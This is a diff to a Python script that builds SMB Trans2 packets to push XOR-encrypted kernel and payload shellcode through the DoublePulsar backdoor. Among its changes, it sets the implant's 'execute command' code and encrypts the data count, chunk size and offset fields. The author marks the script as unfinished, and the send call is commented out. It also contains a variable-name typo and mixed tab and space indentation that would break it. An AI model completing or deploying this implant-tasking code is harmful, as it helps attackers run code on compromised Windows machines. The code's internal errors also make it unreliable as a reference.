@@ -290,10 +290,7 @@ if __name__ == "__main__":
         #add the shellcode after the shellcode size
         modified_kernel_shellcode += payload_shellcode
 
-        #XOR memory buffer
-        xor_encrypt(modified_kernel_shellcode)
-        
-        #fill up the packet structures
+        #fill up the SMB Trans2 Secondary packet structures
         #CODE IS NOT FINISHED HERE
         #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
 
@@ -302,7 +299,7 @@ if __name__ == "__main__":
         #some values here
         doublepulsar_pkt.Flags1 = 0x18
         doublepulsar_pkt.Flags2 = 0xc007
-        doublepulsar_pkt.Timeout = 0x25891a00
+        doublepulsar_pkt.Timeout = 0x25891a00 #execute command for DoublePulsar
         
         #more will be filled if needed
         #unsure if more need to be populated at this time
@@ -318,15 +315,22 @@ if __name__ == "__main__":
         fixedOffset = 32+3+18
         transCommand['Data']['Pad1'] = ''
         
-
         transCommand['Parameters']['ParameterCount'] = 12
         transCommand['Parameters']['ParameterOffset'] = 0
-        transCommand['Parameters']['DataCount'] = len(data)
-        transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
-        transCommand['Parameters']['DataDisplacement'] = displacement
+	
+	#Xor encrypt the parameters
+	'''DataCount ( total size of the shellcode )
+        ChunkSize ( size of the shellcode chunk, or 4096 )
+        Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
+	'''
+        transCommand['Parameters']['DataCount'] = xor_encrypt(len(modified_kernel_shellcode), key)
+	transCommand['Parameters']['ChunkSize'] = xor_encrypt(len(modified_kernel_shellcode), key)
+	transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, key)
+        #transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
+        #transCommand['Parameters']['DataDisplacement'] = displacement
 
         transCommand['Data']['Trans_Parameters'] = '' #parameters
-        transCommand['Data']['Trans_Data'] = data
+        transCommand['Data']['Trans_Data'] = xor_encrypt(modified_kernel_shellcode, key)
         doublpulsar_pkt.addCommand(transCommand)
 
         #conn.sendSMB(doublepulsar_pkt)
